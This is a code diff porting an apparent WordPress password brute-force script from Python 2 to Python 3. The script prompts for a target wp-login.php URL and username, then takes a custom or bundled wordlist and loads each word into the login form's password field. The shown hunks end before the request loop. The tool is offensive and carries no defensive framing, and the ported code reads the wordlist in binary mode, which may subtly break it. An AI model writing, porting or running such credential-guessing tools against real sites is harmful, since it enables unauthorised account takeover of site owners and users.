@@ -1,4 +1,9 @@
-import requests, os, sys, random, multiprocessing
+import requests
+import os
+import sys
+import random
+import multiprocessing
+
 os.system("clear")
 try:
 	CGR = '\33[34m'
@@ -21,15 +26,15 @@ try:
 	print(CRE+" Website  : https://maxteroit.com)"+CEN)
 	print(CRE+" Email    : adittya@maxteroit.com)"+CEN)
 	print("==================================================")
-	target_url = raw_input("Target URL Login Page [Ex: http://aa.com/wp-login.php] : ")
-	username = raw_input("Input Username Target : ")
+	target_url = input("Target URL Login Page [Ex: http://aa.com/wp-login.php] : ")
+	username = input("Input Username Target : ")
 	print("Wordlist : ")
 	print("1. Use your own wodlist")
 	print("2. Use the word list provided")
-	choose = raw_input("Choose [1/2] : ")
+	choose = input("Choose [1/2] : ")
 
 	if choose == str("1"):
-		wordlist = raw_input("Enter your wordlist path : ")
+		wordlist = input("Enter your wordlist path : ")
 	elif choose == str("2"):
 		wordlist = "wordlist.txt"
 	else:
@@ -37,7 +42,7 @@ try:
 
 	data_diction = {"log" : username, "pwd" : "", "wp-submit": "submit"}
 
-	with open(wordlist, "r") as wordlist_file:
+	with open(wordlist, "rb") as wordlist_file:
 		for line in wordlist_file:
 			word = line.strip()
 			data_diction["pwd"] = word
